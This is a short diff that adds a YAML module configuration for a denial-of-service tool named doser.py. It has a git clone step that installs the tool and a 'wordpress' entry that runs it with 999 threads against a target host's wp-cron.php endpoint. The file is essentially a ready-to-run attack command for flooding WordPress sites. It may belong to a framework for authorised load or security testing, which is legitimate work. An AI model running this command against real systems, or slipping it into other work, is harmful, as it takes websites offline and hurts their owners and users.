@@ -1,0 +1,9 @@
+settings:
+  name: "DoS tool for HTTP requests"
+  description: "https://github.com/Quitten/doser.py"
+  
+install:
+  - [ git clone https://github.com/Quitten/doser.py.git ]
+
+wordpress:
+  - [ python3 doser.py -t 999 -g 'https://$(HOST)/wp-cron.php' ]
